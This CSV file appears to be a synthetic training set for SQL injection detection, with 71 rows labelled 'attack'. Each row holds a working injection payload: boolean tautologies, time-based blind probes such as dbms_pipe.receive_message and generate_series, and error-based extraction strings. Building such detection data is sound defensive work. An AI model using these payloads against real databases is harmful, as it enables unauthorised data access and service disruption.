id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000475,0.10112733970936129
SMOTE_000002,attack,boolean,"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'fvov'  =  'fvov",nearest_attack_euclidean,R000140,1.0789760457609772
SMOTE_000003,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000386,0.4210386534922812
SMOTE_000004,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000584,0.009412226537258766
SMOTE_000005,attack,boolean,-7779'  )   where 4976  =  4976 or 6872  =  6872--,nearest_attack_euclidean,R000321,0.0904292515457158
SMOTE_000006,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000716,0.04862611571432708
SMOTE_000007,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000246,0.6845821633599442
SMOTE_000008,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000498,0.5806824259413279
SMOTE_000009,attack,boolean," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000037,0.7588014974917286
SMOTE_000010,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000345,0.7034909914353563
SMOTE_000011,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000340,0.353116279300028
SMOTE_000012,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R000399,0.03015656641691143
SMOTE_000013,attack,boolean,"1""  )   where 9962  =  9962 and 4595  =  4595#",nearest_attack_euclidean,R000696,0.1568131148083347
SMOTE_000014,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000223,0.1727945827029735
SMOTE_000015,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000329,0.3385324268019347
SMOTE_000016,attack,boolean,"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000722,0.03319621669987936
SMOTE_000017,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R000644,0.6218662229370756
SMOTE_000018,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000092,0.7750662477800933
SMOTE_000019,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000579,1.3505291773957906
SMOTE_000020,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000196,1.7436260465426696
SMOTE_000021,attack,boolean,"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp",nearest_attack_euclidean,R000681,1.0835155987481893
SMOTE_000022,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000401,0.7984206035531035
SMOTE_000023,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000655,1.2946173327589816
SMOTE_000024,attack,boolean,1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,nearest_attack_euclidean,R000768,0.7466671285818774
SMOTE_000025,attack,boolean,"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000660,0.15293805000074215
SMOTE_000026,attack,boolean,admin'  )   or   (  '1'  =  '1'#,nearest_attack_euclidean,R000044,2.2009497381148453
SMOTE_000027,attack,boolean,"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000598,0.2562571994016408
SMOTE_000028,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000612,1.4043961120790405
SMOTE_000029,attack,boolean,"-3347%"" or 9323  =  9323#",nearest_attack_euclidean,R000290,1.427181442736637
SMOTE_000030,attack,boolean,"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",nearest_attack_euclidean,R000702,0.5775850752647451
SMOTE_000031,attack,boolean,"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000178,0.5671172702405776
SMOTE_000032,attack,boolean,"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000309,1.1787629994045896
SMOTE_000033,attack,boolean,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000472,0.06668960013480803
SMOTE_000034,attack,boolean,1%' and 9127  =  7687--,nearest_attack_euclidean,R000280,1.693797192622591
SMOTE_000035,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R000135,0.3617965310011887
SMOTE_000036,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000194,0.07234315399501125
SMOTE_000037,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000577,0.15164118008031036
SMOTE_000038,attack,boolean,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',nearest_attack_euclidean,R000727,0.6031444527562705
SMOTE_000039,attack,boolean,"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000335,0.7555289287737949
SMOTE_000040,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000769,0.10909305311532137
SMOTE_000041,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R000533,1.251545920253968
SMOTE_000042,attack,boolean,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000388,0.5562551631594326
SMOTE_000043,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,nearest_attack_euclidean,R000218,0.2704055433227444
SMOTE_000044,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000282,0.12474704034024271
SMOTE_000045,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,1.0357534706998748
SMOTE_000046,attack,boolean,"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,nearest_attack_euclidean,R000262,0.3047923816722778
SMOTE_000047,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R000504,0.511155073934634
SMOTE_000048,attack,boolean,"-2373%""  )   or 9323  =  9323#",nearest_attack_euclidean,R000515,1.1499786413371929
SMOTE_000049,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000138,0.04341694347743066
SMOTE_000050,attack,boolean,1' where 4795  =  4795 and 4595  =  4595#,nearest_attack_euclidean,R000087,1.0761022709562749
SMOTE_000051,attack,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000021,0.07974828598032768
SMOTE_000052,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000009,0.776126364329084
SMOTE_000053,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000602,0.006919386127571707
SMOTE_000054,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000680,0.05266307025378829
SMOTE_000055,attack,boolean,"1""   )    )    and 9198  =  9198--",nearest_attack_euclidean,R000512,0.12337287529467675
SMOTE_000056,attack,boolean,"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000335,0.7522062814082942
SMOTE_000057,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R000182,0.0332579270976819
SMOTE_000058,attack,boolean," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000034,0.8848086429876084
SMOTE_000059,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",nearest_attack_euclidean,R000729,1.205761049948997
SMOTE_000060,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000210,0.05881552685776142
SMOTE_000061,attack,boolean,"1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000269,0.20828331360394736
SMOTE_000062,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000106,0.014849419639521246
SMOTE_000063,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000246,0.03581408330489869
SMOTE_000064,attack,boolean," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000053,0.03230135746070681
SMOTE_000065,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000489,0.3011171260153784
SMOTE_000066,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,0.19612221755435316
SMOTE_000067,attack,boolean,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",nearest_attack_euclidean,R000511,0.3413371939408652
SMOTE_000068,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000061,0.564263920785973
SMOTE_000069,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000201,0.8508464741198718
SMOTE_000070,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000478,1.1145880460904114
SMOTE_000071,attack,boolean,1%'  )   and 2949  =  4847 and   (  '%'  =  ',nearest_attack_euclidean,R000637,1.289612682303068
